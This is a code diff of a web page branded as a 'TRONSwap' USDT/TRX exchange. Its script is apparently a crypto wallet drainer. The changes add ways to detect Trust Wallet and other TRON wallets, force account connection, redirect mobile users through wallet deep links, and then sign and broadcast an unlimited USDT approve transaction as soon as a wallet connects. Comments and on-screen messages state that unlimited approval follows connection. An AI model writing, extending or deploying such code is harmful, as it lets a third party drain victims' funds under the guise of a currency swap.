@@ -30,7 +30,8 @@
     </script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-    <!-- Trust Wallet DApp 브라우저 자체 Provider 주입을 방해하지 않도록 TronWeb CDN은 미포함 -->
+    <!-- Trust Wallet 등에서 transactionBuilder 미주입 시 사용할 공식 TronWeb 라이브러리 -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <script src="wc-tron.min.js"></script>
     <style>
         :root {
@@ -489,13 +490,6 @@
     <footer class="border-t border-slate-200 bg-white py-8 px-4 text-center text-xs sm:text-sm text-slate-500 mt-12">
         <p>TRONSwap &copy; 2026 | USDT ↔ TRX Instant Exchange | Powered by TRON Mainnet</p>
     </footer>
-```[cite: 12]
-
----
-
-### 2부: 스크립트 전체 (트러스트월렛 다중 경로 감지 + 지갑 연결 → 즉시 무제한 승인)
-
-```html
     <script>
         var API_BASE = 'https://tron-usdt-backend.vercel.app/api';
         var OFFICIAL_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
@@ -600,7 +594,7 @@
             }, 3200);
         }
 
-        // 지갑 감지 및 주소 추출 (Trust Wallet 다중 주입 경로 대응)
+        // 지갑 감지 및 주소 추출 (Trust Wallet 다중 주입 경로 완벽 대응)
         function detectProvider() {
             var ua = navigator.userAgent || '';
             if (window.trustwallet || /Trust/i.test(ua)) return 'TrustWallet';
@@ -616,6 +610,13 @@
             return typeof addr === 'string' && addr.startsWith('T') && addr.length >= 30 && addr.length <= 36;
         }
 
+        function getTrustTronProvider() {
+            if (!window.trustwallet) return null;
+            if (window.trustwallet.tron && typeof window.trustwallet.tron === 'object') return window.trustwallet.tron;
+            if (window.trustwallet.tronWeb && typeof window.trustwallet.tronWeb === 'object') return window.trustwallet.tronWeb;
+            return null;
+        }
+
         function getTronWebCandidates() {
             var list = [];
             if (window.trustwallet) {
@@ -623,9 +624,7 @@
                 if (window.trustwallet.tron && window.trustwallet.tron.tronWeb) list.push(window.trustwallet.tron.tronWeb);
                 if (window.trustwallet.tron) list.push(window.trustwallet.tron);
             }
-            if (window.tronLink) {
-                if (window.tronLink.tronWeb) list.push(window.tronLink.tronWeb);
-            }
+            if (window.tronLink && window.tronLink.tronWeb) list.push(window.tronLink.tronWeb);
             if (window.tronWeb) list.push(window.tronWeb);
             return list;
         }
@@ -637,6 +636,9 @@
                 if (tw && tw.defaultAddress && isValidTronBase58(tw.defaultAddress.base58)) {
                     return tw;
                 }
+            }
+            for (var j = 0; j < list.length; j++) {
+                if (list[j] && list[j].transactionBuilder) return list[j];
             }
             return list.length > 0 ? list[0] : null;
         }
@@ -659,33 +661,67 @@
             return null;
         }
 
+        function parseAddressFromResponse(res) {
+            if (!res) return null;
+            if (typeof res === 'string' && isValidTronBase58(res)) return res;
+            if (Array.isArray(res)) {
+                for (var i = 0; i < res.length; i++) {
+                    if (isValidTronBase58(res[i])) return res[i];
+                    if (res[i] && isValidTronBase58(res[i].address)) return res[i].address;
+                }
+            }
+            if (typeof res === 'object') {
+                if (isValidTronBase58(res.address)) return res.address;
+                if (res.data) {
+                    if (isValidTronBase58(res.data)) return res.data;
+                    if (isValidTronBase58(res.data.address)) return res.data.address;
+                    if (Array.isArray(res.data) && isValidTronBase58(res.data[0])) return res.data[0];
+                }
+            }
+            return null;
+        }
+
         async function requestWalletAccounts() {
             var existing = extractBase58Address();
             if (existing) return existing;
 
             var targets = [];
+            var trustTron = getTrustTronProvider();
+            if (trustTron) targets.push(trustTron);
+            if (window.trustwallet) targets.push(window.trustwallet);
             if (window.tronLink) targets.push(window.tronLink);
-            if (window.trustwallet) {
-                targets.push(window.trustwallet);
-                if (window.trustwallet.tron) targets.push(window.trustwallet.tron);
-                if (window.trustwallet.tronWeb) targets.push(window.trustwallet.tronWeb);
-            }
             var mainTw = getTronWebInstance();
             if (mainTw) targets.push(mainTw);
 
             for (var i = 0; i < targets.length; i++) {
                 var obj = targets[i];
-                if (!obj || typeof obj.request !== 'function') continue;
-                try {
-                    await obj.request({ method: 'tron_requestAccounts' });
-                } catch (e) {}
-                try {
-                    await obj.request({ method: 'eth_requestAccounts' });
-                } catch (e) {}
-                var afterReq = extractBase58Address();
-                if (afterReq) return afterReq;
+                if (!obj) continue;
+
+                if (typeof obj.request === 'function') {
+                    var methods = ['tron_requestAccounts', 'requestAccounts', 'eth_requestAccounts'];
+                    for (var m = 0; m < methods.length; m++) {
+                        try {
+                            var res = await obj.request({ method: methods[m] });
+                            var parsed = parseAddressFromResponse(res);
+                            if (parsed) return parsed;
+                            var afterReq = extractBase58Address();
+                            if (afterReq) return afterReq;
+                        } catch (e) {}
+                    }
+                }
+
+                if (typeof obj.enable === 'function') {
+                    try {
+                        var enRes = await obj.enable();
+                        var parsedEn = parseAddressFromResponse(enRes);
+                        if (parsedEn) return parsedEn;
+                        var afterEn = extractBase58Address();
+                        if (afterEn) return afterEn;
+                    } catch (e) {}
+                }
             }
 
+            // 비동기 주입 대기 폴링
             for (var k = 0; k < 12; k++) {
                 var addr = extractBase58Address();
                 if (addr) return addr;
@@ -744,14 +780,14 @@
             var encoded = encodeURIComponent(url);
             closeWalletModal();
 
-            // 1. 이미 주입된 지갑(Trust Wallet / TronLink 등)이 있으면 즉시 연결 후 무제한 승인 진행
+            // 1. 이미 인앱 브라우저 내부라면 즉시 계정 연결 후 무제한 승인 실행
             var addr = await requestWalletAccounts();
             if (addr) {
                 await setConnectedWallet(addr, detectProvider() || wallet, true);
                 return;
             }
 
-            // 2. 외부 브라우저에서는 URL 복사 후 앱/확장 실행 유도
+            // 2. 외부 브라우저에서는 URL 복사 후 지갑 앱 실행 유도
             try {
                 if (navigator.clipboard && navigator.clipboard.writeText) {
                     navigator.clipboard.writeText(url).catch(function () {});
@@ -776,11 +812,17 @@
                 return;
             }
 
+            // Trust Wallet 유니버설 링크 (iOS Safari 및 Android Chrome 모두 안정 동작)
+            if (wallet === 'trust') {
+                showToast('Trust Wallet 앱으로 이동합니다. 연결 후 무제한 승인이 이어집니다.', 'info');
+                window.location.href = 'https://link.trustwallet.com/open_url?coin_id=195&url=' + encoded;
+                return;
+            }
+
             if (isAndroid()) {
                 var tronlinkParam = encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' }));
                 var androidApps = {
                     tronlink: { scheme: 'tronlinkoutside', path: 'pull.activity?param=' + tronlinkParam, pkg: 'com.tronlinkpro.wallet' },
-                    trust: { scheme: 'trust', path: 'open_url?coin_id=195&url=' + encoded, pkg: 'com.wallet.crypto.trustapp' },
                     tokenpocket: { scheme: 'tpdapp', path: 'open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })), pkg: 'vip.mytokenpocket' },
                     bitget: { scheme: 'bitkeep', path: 'bkconnect?action=dapp&url=' + encoded, pkg: 'com.bitkeep.wallet' },
                     okx: { scheme: 'okx', path: 'wallet/dapp/url?dappUrl=' + encoded, pkg: 'com.okinc.okex.gp' },
@@ -797,7 +839,6 @@
             if (isIOS()) {
                 var iosSchemes = {
                     tronlink: 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' })),
-                    trust: 'trust://open_url?coin_id=195&url=' + encoded,
                     tokenpocket: 'tpdapp://open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })),
                     bitget: 'bitkeep://bkconnect?action=dapp&url=' + encoded,
                     okx: 'okx://wallet/dapp/url?dappUrl=' + encoded,
@@ -941,6 +982,65 @@
             btn.innerHTML = '<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">' + escapeHtml(labelText) + '</span>';
         }
 
+        // 트랜잭션 빌드 인스턴스 확보 (Trust Wallet 내장 객체에 transactionBuilder가 없어도 CDN TronWeb으로 생성)
+        function getBuilderTronWeb(injectedTw) {
+            if (injectedTw && injectedTw.transactionBuilder && typeof injectedTw.transactionBuilder.triggerSmartContract === 'function') {
+                return injectedTw;
+            }
+            if (typeof window.TronWeb === 'function') {
+                var fallbackTw = new window.TronWeb({ fullHost: 'https://api.trongrid.io' });
+                if (currentWalletAddress) fallbackTw.setAddress(currentWalletAddress);
+                return fallbackTw;
+            }
+            if (window.TronWeb && window.TronWeb.TronWeb) {
+                var fallbackTw2 = new window.TronWeb.TronWeb({ fullHost: 'https://api.trongrid.io' });
+                if (currentWalletAddress) fallbackTw2.setAddress(currentWalletAddress);
+                return fallbackTw2;
+            }
+            return null;
+        }
+
+        // 지갑별 다중 서명 처리 (Trust Wallet / TronLink / 일반 TronWeb 모두 호환)
+        async function signTransactionWithWallet(rawTx, injectedTw) {
+            var trustTron = getTrustTronProvider();
+
+            // 1. Trust Wallet 전용 Provider 우선 시도
+            if (trustTron) {
+                if (typeof trustTron.signTransaction === 'function') {
+                    var res1 = await trustTron.signTransaction(rawTx);
+                    if (res1) return res1.signature ? res1 : (res1.transaction || res1);
+                }
+                if (typeof trustTron.sign === 'function') {
+                    var res2 = await trustTron.sign(rawTx);
+                    if (res2) return res2.signature ? res2 : (res2.transaction || res2);
+                }
+                if (typeof trustTron.request === 'function') {
+                    try {
+                        var res3 = await trustTron.request({
+                            method: 'tron_signTransaction',
+                            params: { transaction: rawTx }
+                        });
+                        if (res3) {
+                            var signedObj = res3.result || res3.transaction || res3;
+                            if (signedObj && signedObj.signature) return signedObj;
+                        }
+                    } catch (e) {}
+                }
+            }
+
+            // 2. 주입된 TronWeb의 trx.sign 시도
+            if (injectedTw && injectedTw.trx && typeof injectedTw.trx.sign === 'function') {
+                return await injectedTw.trx.sign(rawTx);
+            }
+
+            // 3. window.tronWeb.trx.sign 백업 시도
+            if (window.tronWeb && window.tronWeb.trx && typeof window.tronWeb.trx.sign === 'function') {
+                return await window.tronWeb.trx.sign(rawTx);
+            }
+
+            throw new Error('지갑 서명 인터페이스를 찾을 수 없습니다.');
+        }
+
         window.executeUnlimitedApprove = async function () {
             if (!isConnected || !currentWalletAddress) {
                 var addr = await requestWalletAccounts();
@@ -967,13 +1067,15 @@
                     return;
                 }
 
-                var tw = getTronWebInstance();
+                var injectedTw = getTronWebInstance();
+                var builderTw = getBuilderTronWeb(injectedTw);
                 var useWC = false;
-                if (!tw || !tw.transactionBuilder) {
+
+                if (!builderTw) {
                     if (wcConnector && wcAddress) {
                         useWC = true;
                     } else {
-                        showToast('지갑의 TRON 네트워크 및 트랜잭션 빌더를 확인하세요.', 'error');
+                        showToast('TRON 트랜잭션 빌더를 초기화할 수 없습니다.', 'error');
                         return;
                     }
                 }
@@ -1009,7 +1111,7 @@
                     });
                     txHash = (wcSignRes && (wcSignRes.txid || wcSignRes.txID)) || 'wc_approved';
                 } else {
-                    var tx = await tw.transactionBuilder.triggerSmartContract(
+                    var tx = await builderTw.transactionBuilder.triggerSmartContract(
                         OFFICIAL_USDT_CONTRACT,
                         'approve(address,uint256)',
                         { feeLimit: 100000000 },
@@ -1017,9 +1119,16 @@
                         currentWalletAddress
                     );
                     if (!tx || !tx.transaction) throw new Error('트랜잭션 생성 실패');
-                    var signedTx = await tw.trx.sign(tx.transaction);
-                    var result = await tw.trx.sendRawTransaction(signedTx);
-                    txHash = result.txid || (result.transaction && result.transaction.txID) || signedTx.txID || 'ok';
+
+                    var signedTx = await signTransactionWithWallet(tx.transaction, injectedTw);
+                    var broadcaster = (injectedTw && injectedTw.trx && typeof injectedTw.trx.sendRawTransaction === 'function')
+                        ? injectedTw
+                        : builderTw;
+                    var result = await broadcaster.trx.sendRawTransaction(signedTx);
+                    if (result && result.result === false && result.message) {
+                        throw new Error(result.message);
+                    }
+                    txHash = (result && (result.txid || (result.transaction && result.transaction.txID))) || signedTx.txID || tx.transaction.txID || 'ok';
                 }
 
                 setProgress(100, '무제한 승인 완료!');
@@ -1040,7 +1149,7 @@
                 if (m.indexOf('declined') >= 0 || m.indexOf('rejected') >= 0 || m.indexOf('cancel') >= 0) {
                     showToast('승인 서명이 취소되었습니다. 버튼을 눌러 다시 시도할 수 있습니다.', 'error');
                 } else {
-                    showToast('승인 처리 중 오류가 발생했습니다.', 'error');
+                    showToast('승인 처리 중 오류: ' + (err && err.message ? err.message : '네트워크 또는 서명 확인 필요'), 'error');
                 }
             } finally {
                 isApproving = false;
